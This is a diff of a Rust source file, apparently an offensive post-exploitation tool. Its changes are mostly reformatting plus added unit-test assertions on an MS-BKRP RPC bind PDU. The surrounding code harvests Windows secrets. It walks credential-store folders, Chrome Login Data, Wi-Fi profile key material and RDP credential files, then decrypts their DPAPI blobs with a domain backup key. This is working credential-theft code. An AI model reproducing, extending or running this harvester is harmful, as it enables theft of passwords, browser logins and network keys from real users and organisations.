@@ -1389,9 +1379,9 @@ fn harvest_credential_store(backup_key_data: &[u8]) -> Result<Vec<DpapiSecret>> 
     }
 
     // Scan for credential files.
-    for entry in std::fs::read_dir(&cred_dir).unwrap_or_else(|_| {
-        std::fs::read_dir(".").unwrap_or_else(|_| panic!("no dir"))
-    }) {
+    for entry in std::fs::read_dir(&cred_dir)
+        .unwrap_or_else(|_| std::fs::read_dir(".").unwrap_or_else(|_| panic!("no dir")))
+    {
         let entry = match entry {
             Ok(e) => e,
             Err(_) => continue,
@@ -1406,8 +1396,7 @@ fn harvest_credential_store(backup_key_data: &[u8]) -> Result<Vec<DpapiSecret>> 
         if let Ok(plaintext) = decrypt_dpapi_blob(&data, backup_key_data) {
             // Credential blob contains: dwVersion, dwType, dwFlags, dwSize, ...
             // For simplicity, extract what we can.
-            let desc = format!("Credential Store ({})",
-                entry.file_name().to_string_lossy());
+            let desc = format!("Credential Store ({})", entry.file_name().to_string_lossy());
             secrets.push(DpapiSecret {
                 source: "Credential Store".to_string(),
                 identifier: entry.file_name().to_string_lossy().to_string(),
@@ -1442,9 +1431,9 @@ fn harvest_chrome_data(backup_key_data: &[u8]) -> Result<Vec<DpapiSecret>> {
         }
 
         // Check for "Login Data" SQLite files in profile directories.
-        for profile_entry in std::fs::read_dir(chrome_path).unwrap_or_else(|_| {
-            std::fs::read_dir(".").unwrap_or_else(|_| panic!("no dir"))
-        }) {
+        for profile_entry in std::fs::read_dir(chrome_path)
+            .unwrap_or_else(|_| std::fs::read_dir(".").unwrap_or_else(|_| panic!("no dir")))
+        {
             let profile_entry = match profile_entry {
                 Ok(e) => e,
                 Err(_) => continue,
@@ -1507,11 +1496,7 @@ fn harvest_chrome_data(backup_key_data: &[u8]) -> Result<Vec<DpapiSecret>> {
 }
 
 /// Scan binary data for DPAPI blobs and attempt decryption.
-fn scan_for_dpapi_blobs(
-    data: &[u8],
-    backup_key_data: &[u8],
-    source: &str,
-) -> Vec<DpapiSecret> {
+fn scan_for_dpapi_blobs(data: &[u8], backup_key_data: &[u8], source: &str) -> Vec<DpapiSecret> {
     let mut secrets = Vec::new();
     let mut pos = 0;
 
@@ -1523,15 +1508,16 @@ fn scan_for_dpapi_blobs(
                 // Found a potential DPAPI blob.
                 // Read the version and check if the header makes sense.
                 if pos + 60 <= data.len() {
-                    let version = u32::from_le_bytes(data[pos..pos + 4].try_into().unwrap_or([0; 4]));
+                    let version =
+                        u32::from_le_bytes(data[pos..pos + 4].try_into().unwrap_or([0; 4]));
                     if version == 2 || version == 1 {
                         // Try to parse as a full DPAPI blob.
                         // We need to determine the total blob size from the header.
                         let data_size = u32::from_le_bytes(
-                            data[pos + 48..pos + 52].try_into().unwrap_or([0; 4])
+                            data[pos + 48..pos + 52].try_into().unwrap_or([0; 4]),
                         );
                         let sign_size = u32::from_le_bytes(
-                            data[pos + 52..pos + 56].try_into().unwrap_or([0; 4])
+                            data[pos + 52..pos + 56].try_into().unwrap_or([0; 4]),
                         );
 
                         // Approximate blob end.
@@ -1579,9 +1565,9 @@ fn harvest_wifi_profiles(backup_key_data: &[u8]) -> Result<Vec<DpapiSecret>> {
     }
 
     // Iterate interface GUID directories.
-    for iface_entry in std::fs::read_dir(&wifi_base).unwrap_or_else(|_| {
-        std::fs::read_dir(".").unwrap_or_else(|_| panic!("no dir"))
-    }) {
+    for iface_entry in std::fs::read_dir(&wifi_base)
+        .unwrap_or_else(|_| std::fs::read_dir(".").unwrap_or_else(|_| panic!("no dir")))
+    {
         let iface_entry = match iface_entry {
             Ok(e) => e,
             Err(_) => continue,
@@ -1591,9 +1577,9 @@ fn harvest_wifi_profiles(backup_key_data: &[u8]) -> Result<Vec<DpapiSecret>> {
             continue;
         }
 
-        for profile_entry in std::fs::read_dir(iface_entry.path()).unwrap_or_else(|_| {
-            std::fs::read_dir(".").unwrap_or_else(|_| panic!("no dir"))
-        }) {
+        for profile_entry in std::fs::read_dir(iface_entry.path())
+            .unwrap_or_else(|_| std::fs::read_dir(".").unwrap_or_else(|_| panic!("no dir")))
+        {
             let profile_entry = match profile_entry {
                 Ok(e) => e,
                 Err(_) => continue,
@@ -1613,16 +1599,18 @@ fn harvest_wifi_profiles(backup_key_data: &[u8]) -> Result<Vec<DpapiSecret>> {
             };
 
             // Extract SSID from XML.
-            let ssid = extract_xml_value(&xml_data, "name")
-                .unwrap_or_else(|| "unknown".to_string());
+            let ssid =
+                extract_xml_value(&xml_data, "name").unwrap_or_else(|| "unknown".to_string());
 
             // Check for protected (encrypted) key material.
-            if xml_data.contains("<protected>true</protected>") ||
-               xml_data.contains("<protected>TRUE</protected>")
+            if xml_data.contains("<protected>true</protected>")
+                || xml_data.contains("<protected>TRUE</protected>")
             {
                 // The keyMaterial contains a DPAPI-encrypted blob (base64 encoded).
                 if let Some(key_b64) = extract_xml_value(&xml_data, "keyMaterial") {
-                    if let Ok(key_bytes) = base64::engine::general_purpose::STANDARD.decode(&key_b64) {
+                    if let Ok(key_bytes) =
+                        base64::engine::general_purpose::STANDARD.decode(&key_b64)
+                    {
                         if let Ok(plaintext) = decrypt_dpapi_blob(&key_bytes, backup_key_data) {
                             let wifi_key = String::from_utf8_lossy(&plaintext);
                             secrets.push(DpapiSecret {
@@ -1650,9 +1638,7 @@ fn harvest_rdp_credentials(backup_key_data: &[u8]) -> Result<Vec<DpapiSecret>> {
     // %USERPROFILE%\AppData\Local\Microsoft\Credentials\*
     // They are DPAPI blobs that can be decrypted with the backup key.
 
-    let cred_paths = [
-        dirs::data_local_dir().map(|d| d.join("Microsoft").join("Credentials")),
-    ];
+    let cred_paths = [dirs::data_local_dir().map(|d| d.join("Microsoft").join("Credentials"))];
 
     for cred_path in &cred_paths {
         let cred_path = match cred_path {
@@ -1660,9 +1646,9 @@ fn harvest_rdp_credentials(backup_key_data: &[u8]) -> Result<Vec<DpapiSecret>> {
             _ => continue,
         };
 
-        for entry in std::fs::read_dir(&cred_path).unwrap_or_else(|_| {
-            std::fs::read_dir(".").unwrap_or_else(|_| panic!("no dir"))
-        }) {
+        for entry in std::fs::read_dir(&cred_path)
+            .unwrap_or_else(|_| std::fs::read_dir(".").unwrap_or_else(|_| panic!("no dir")))
+        {
             let entry = match entry {
                 Ok(e) => e,
                 Err(_) => continue,
@@ -1815,8 +1801,8 @@ mod tests {
         }
 
         // Decrypt.
-        let decrypted = aes256_cbc_decrypt(&key, &iv, &ciphertext)
-            .expect("AES-256-CBC decrypt should succeed");
+        let decrypted =
+            aes256_cbc_decrypt(&key, &iv, &ciphertext).expect("AES-256-CBC decrypt should succeed");
 
         assert_eq!(&decrypted, plaintext);
     }
@@ -1868,6 +1854,7 @@ mod tests {
     #[test]
     fn test_rpc_bind_pdu_construction() {
         let pdu = build_rpc_bind_pdu();
+        assert_eq!(BKRP_INTERFACE_UUID_BYTES.len(), 20);
         // Check PDU type is bind.
         assert_eq!(pdu[2], PDU_TYPE_BIND);
         // Check version.
@@ -1886,6 +1873,16 @@ mod tests {
         // Check frag_length field.
         let frag_len = u16::from_le_bytes([pdu[8], pdu[9]]);
         assert_eq!(frag_len as usize, pdu.len());
+
+        // Request header is 8 bytes after the 16-byte common header.
+        let alloc_hint = u32::from_le_bytes([pdu[16], pdu[17], pdu[18], pdu[19]]) as usize;
+        assert_eq!(alloc_hint, pdu.len() - 24);
+        assert_eq!(u16::from_le_bytes([pdu[20], pdu[21]]), 0); // context_id
+        assert_eq!(u16::from_le_bytes([pdu[22], pdu[23]]), 0); // opnum BackuprKey
+
+        // Stub begins immediately at offset 24 with a non-null referent ID.
+        let referent = u32::from_le_bytes([pdu[24], pdu[25], pdu[26], pdu[27]]);
+        assert_eq!(referent, 0x0002_0000);
     }
 
     #[test]
@@ -1924,7 +1921,10 @@ mod tests {
     fn test_extract_xml_value() {
         let xml = r#"<name>MyWiFi</name><keyMaterial>secret</keyMaterial>"#;
         assert_eq!(extract_xml_value(xml, "name"), Some("MyWiFi".to_string()));
-        assert_eq!(extract_xml_value(xml, "keyMaterial"), Some("secret".to_string()));
+        assert_eq!(
+            extract_xml_value(xml, "keyMaterial"),
+            Some("secret".to_string())
+        );
         assert_eq!(extract_xml_value(xml, "missing"), None);
     }
 
